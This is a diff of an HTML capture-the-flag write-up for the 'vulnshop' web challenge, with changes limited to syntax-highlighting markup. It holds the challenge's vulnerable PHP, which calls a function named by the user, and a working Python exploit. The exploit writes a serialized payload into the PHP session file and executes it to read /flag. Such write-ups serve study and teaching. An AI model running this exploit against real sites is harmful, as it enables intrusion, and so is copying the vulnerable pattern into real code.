@@ -24,7 +24,7 @@
     <!-- Fonts & Icons -->
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/academicons@1.9.1/css/academicons.min.css" integrity="sha256-i1+4qU2G2860dGGIOJscdC30s9beBXjFfzjWLjBRsBg=" crossorigin="anonymous">
-    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700%7CRoboto+Slab:100,300,400,500,700%7CMaterial+Icons">
+    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons">
 
     <!-- Code Syntax Highlighting -->
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jwarby/jekyll-pygments-themes@master/github.css" media="" id="highlight_theme_light">
@@ -153,17 +153,17 @@
 
 <figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">case</span> <span class="s1">'contactus'</span><span class="o">:</span>
   <span class="k">echo</span> <span class="s2">"&lt;p&gt;You can't contact us for the moment, but it will be available later.&lt;/p&gt;"</span><span class="p">;</span>
-  <span class="err">$\</span><span class="n">_SESSION</span><span class="p">[</span><span class="s1">'challenge'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">rand</span><span class="p">(</span><span class="mi">100000</span><span class="p">,</span><span class="mi">999999</span><span class="p">);</span>
+  <span class="err">$</span><span class="n">\_SESSION</span><span class="p">[</span><span class="s1">'challenge'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">rand</span><span class="p">(</span><span class="mi">100000</span><span class="p">,</span><span class="mi">999999</span><span class="p">);</span>
   <span class="k">break</span><span class="p">;</span>
 <span class="k">case</span> <span class="s1">'captcha'</span><span class="o">:</span>
-  <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="err">$\</span><span class="n">_SESSION</span><span class="p">[</span><span class="s1">'challenge'</span><span class="p">]))</span> <span class="k">echo</span> <span class="err">$\</span><span class="n">_SESSION</span><span class="p">[</span><span class="s1">'challenge'</span><span class="p">];</span>
+  <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="err">$</span><span class="n">\_SESSION</span><span class="p">[</span><span class="s1">'challenge'</span><span class="p">]))</span> <span class="k">echo</span> <span class="err">$</span><span class="n">\_SESSION</span><span class="p">[</span><span class="s1">'challenge'</span><span class="p">];</span>
   <span class="c1">// Will make an image later</span>
-    <span class="nb">touch</span><span class="p">(</span><span class="err">$\</span><span class="n">_SESSION</span><span class="p">[</span><span class="s1">'challenge'</span><span class="p">]);</span>
+    <span class="nb">touch</span><span class="p">(</span><span class="err">$</span><span class="n">\_SESSION</span><span class="p">[</span><span class="s1">'challenge'</span><span class="p">]);</span>
     <span class="k">break</span><span class="p">;</span>
 <span class="k">case</span> <span class="s1">'captcha-verify'</span><span class="o">:</span>
 <span class="c1">// verification functions take a file for later, when we'll provide more way of verification</span>
   <span class="k">function</span> <span class="n">verifyFromString</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$response</span><span class="p">)</span> <span class="p">{</span>
-  <span class="k">if</span><span class="p">(</span><span class="err">$\</span><span class="n">_SESSION</span><span class="p">[</span><span class="s1">'challenge'</span><span class="p">]</span> <span class="o">===</span> <span class="nv">$response</span><span class="p">)</span> <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+  <span class="k">if</span><span class="p">(</span><span class="err">$</span><span class="n">\_SESSION</span><span class="p">[</span><span class="s1">'challenge'</span><span class="p">]</span> <span class="o">===</span> <span class="nv">$response</span><span class="p">)</span> <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
   <span class="k">else</span> <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
  <span class="p">}</span>  </code></pre></figure>
 
@@ -176,8 +176,8 @@ which basically stores a random number between the specified value and in return
 
 <p>Let that be pretty much and let’s move ahead in the source code. The very next piece of code,</p>
 
-<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="err">$\</span><span class="n">_REQUEST</span><span class="p">[</span><span class="s1">'answer'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="err">$\</span><span class="n">_REQUEST</span><span class="p">[</span><span class="s1">'method'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">function_exists</span><span class="p">(</span><span class="err">$\</span><span class="n">_REQUEST</span><span class="p">[</span><span class="s1">'method'</span><span class="p">])){</span>
-    <span class="err">$\</span><span class="n">_REQUEST</span><span class="p">[</span><span class="s1">'method'</span><span class="p">](</span><span class="s2">"./"</span><span class="mf">.</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'challenge'</span><span class="p">],</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'answer'</span><span class="p">]);</span>
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="err">$</span><span class="n">\_REQUEST</span><span class="p">[</span><span class="s1">'answer'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="err">$</span><span class="n">\_REQUEST</span><span class="p">[</span><span class="s1">'method'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">function_exists</span><span class="p">(</span><span class="err">$</span><span class="n">\_REQUEST</span><span class="p">[</span><span class="s1">'method'</span><span class="p">])){</span>
+    <span class="err">$</span><span class="n">\_REQUEST</span><span class="p">[</span><span class="s1">'method'</span><span class="p">](</span><span class="s2">"./"</span><span class="mf">.</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'challenge'</span><span class="p">],</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'answer'</span><span class="p">]);</span>
 <span class="p">}</span></code></pre></figure>
 
 <p>we can see how the request is made, mainly two parameters as <code class="language-plaintext highlighter-rouge">GET</code> request.</p>
@@ -202,17 +202,17 @@ which basically stores a random number between the specified value and in return
 </span><span class="kn">import</span> <span class="n">sys</span>
 <span class="kn">import</span> <span class="n">requests</span>
 
-<span class="n">url</span> <span class="o">=</span> <span class="s">"http://vulnshop.teaser.insomnihack.ch/"</span>
+<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://vulnshop.teaser.insomnihack.ch/</span><span class="sh">"</span>
 <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nc">Session</span><span class="p">()</span>
 
-<span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s">"?page=contactus"</span><span class="p">)</span>
-<span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s">"?page=captcha"</span><span class="p">)</span>
-<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s">'?page=captcha-verify&amp;method=file_put_contents&amp;answer=challenge|s:35:"print_r(file_get_contents(</span><span class="se">\'</span><span class="s">/flag</span><span class="se">\'</span><span class="s">))";'</span><span class="p">)</span>
-<span class="n">s</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">get_dict</span><span class="p">()[</span><span class="s">'PHPSESSID'</span><span class="p">]</span>
-<span class="n">val</span> <span class="o">=</span> <span class="s">"Value of Cookie = "</span> <span class="o">+</span> <span class="n">s</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">get_dict</span><span class="p">()[</span><span class="s">'PHPSESSID'</span><span class="p">]</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="sh">"</span><span class="s">?page=contactus</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="sh">"</span><span class="s">?page=captcha</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="sh">'</span><span class="s">?page=captcha-verify&amp;method=file_put_contents&amp;answer=challenge|s:35:</span><span class="sh">"</span><span class="s">print_r(file_get_contents(</span><span class="se">\'</span><span class="s">/flag</span><span class="se">\'</span><span class="s">))</span><span class="sh">"</span><span class="s">;</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">get_dict</span><span class="p">()[</span><span class="sh">'</span><span class="s">PHPSESSID</span><span class="sh">'</span><span class="p">]</span>
+<span class="n">val</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Value of Cookie = </span><span class="sh">"</span> <span class="o">+</span> <span class="n">s</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">get_dict</span><span class="p">()[</span><span class="sh">'</span><span class="s">PHPSESSID</span><span class="sh">'</span><span class="p">]</span>
 
-<span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s">"?page=captcha-verify&amp;method=rename&amp;answer=/var/lib/php/sessions/sess_"</span><span class="o">+</span><span class="n">s</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">get_dict</span><span class="p">()[</span><span class="s">'PHPSESSID'</span><span class="p">])</span>
-<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s">"?page=captcha-verify&amp;method=verifyFromMath&amp;answer=1"</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="sh">"</span><span class="s">?page=captcha-verify&amp;method=rename&amp;answer=/var/lib/php/sessions/sess_</span><span class="sh">"</span><span class="o">+</span><span class="n">s</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">get_dict</span><span class="p">()[</span><span class="sh">'</span><span class="s">PHPSESSID</span><span class="sh">'</span><span class="p">])</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="sh">"</span><span class="s">?page=captcha-verify&amp;method=verifyFromMath&amp;answer=1</span><span class="sh">"</span><span class="p">)</span>
 
 <span class="k">print</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span></code></pre></figure>
 
